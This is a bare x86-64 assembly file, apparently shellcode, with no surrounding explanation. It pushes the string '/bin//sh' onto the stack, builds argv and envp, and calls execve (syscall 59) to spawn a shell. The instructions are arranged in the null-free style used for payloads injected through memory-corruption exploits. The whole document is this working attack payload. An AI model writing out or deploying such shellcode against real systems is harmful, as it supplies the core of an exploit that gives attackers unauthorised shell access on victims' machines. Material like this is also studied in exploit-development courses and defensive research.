bits 64
section .text

_start:
    sub rsp, byte 0x70
    xor rcx, rcx
    mov rdx, rcx
    mov qword [rsp+0x28], rdx
    mov rdx, 0x68732f2f6e69622f
    mov qword [rsp+0x20], rdx
    lea rdi, [rsp+0x20]
    mov qword [rsp+0x10], rdi
    mov qword [rsp+0x18], rcx
    mov qword [rsp+0x08], rcx
    lea rsi, [rsp+0x10]
    lea rdx, [rsp+0x08]
    mov rax, rcx
    mov al, byte 59
    syscall
